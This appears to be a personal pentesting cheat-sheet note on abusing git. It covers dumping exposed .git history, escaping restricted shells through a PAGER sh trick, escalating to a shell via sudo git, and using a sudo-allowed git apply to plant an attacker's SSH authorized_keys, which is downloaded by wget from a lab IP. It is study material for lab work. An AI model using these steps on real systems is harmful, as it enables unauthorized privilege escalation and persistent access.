---
creation date: April 6th 2023
last modified date: April 6th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[git]]  
___

## Description:  
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git
### Setting up a .git folder

```
git init master

git status

git add file.sh

git commit -m "First Test"

git log

git diff 4aefc023afb818866bd8c0920d438b44e76f642b a154424d8711ee481cf2e09b8acc6bbc844cddbe > patch.patch
```
If you have a directory with a .git folder you can run git commands locally without needing to run `git init`


### Git History
You can find past commits if there is a .git folder present:
https://github.com/internetwache/GitTools/tree/master/Extractor
```
bash extractor.sh /tmp/mygitrepo /tmp/mygitrepodump
 
bash extractor.sh . .
 
You can also:
 
View the commit history with:
git log
 
to go back to a specific commit:
git revert 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```

### Break out of restricted shells
```
PAGER='sh -c "exec ifconfig0<&1"' git -p help
```

### Exploiting Sudo Rights

```
sudo git help config
!/bin/sh
```
**how to write to files with git apply
```
sudo -l
(sbrown) PASSWD: /usr/bin/git apply *

git init ssh
cd ssh
touch test.txt
git add test.txt
git commit -m "first"
mkdir .ssh
cd .ssh
wget http://10.10.14.114/authorized_keys
git add .ssh
git add .ssh/authorized_keys
git commit -m "second"
git log
git diff 4aefc023afb818866bd8c0920d438b44e76f642b a154424d8711ee481cf2e09b8acc6bbc844cddbe > patch.patch

cat patch.diff
diff --git a/.ssh/authorized_keys b/.ssh/authorized_keys
new file mode 100644
index 0000000..c894625
--- /dev/null
+++ b/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfweJKES1mbsQvIz38/qY4sw3bp00ZpotUQYSNojm4cJtUfGrqAnQZJIbdrDIt+HurlriGzJ9YT6dObFiT8gXPF2GWOyWnC/Vz5Ze0nqcqGtZ8/McUaOKXCayZEq1Nhnx1dHgOqYwC6YOstfi10dobSD2FnG+hAKnsVJJ2KQWVV58lMkOodjbPSAnciI8uuEX/JyOd8cGnCHafybhoN0dq002soRxzToP16hoPgyKAy4BFJOc2JoDLOAb4hFSe9LRD1NoCysxOKOgg+dKqVAGY24Ih06yX+Nfaoq4JlNkrk/Kk7/DGL5wv+17hfmujKegTo9WRxrrW2m6B4kmoNYQNMNG6UQYCprjefAm41XYZmtot2hlLSU86fNTnVe83nYkpoAgc2RRhnhVyH8rHETtBEOLsbCX/WQBEU1buNE1lM0ZURZStvai2DBDtEYDC7Djf2uSqibCNB2yflKdv7Rj7D60/oEBYZrEfVPX8464RQkGVb8xu7VPHZwizI1FoM8E= kali@kali

sudo -u sbrown /usr/bin/git apply patch.patch -v --directory=~/

Checking patch ~/.ssh/authorized_keys...
Applied patch ~/.ssh/authorized_keys cleanly.
```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 6th 2023 (09:09 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
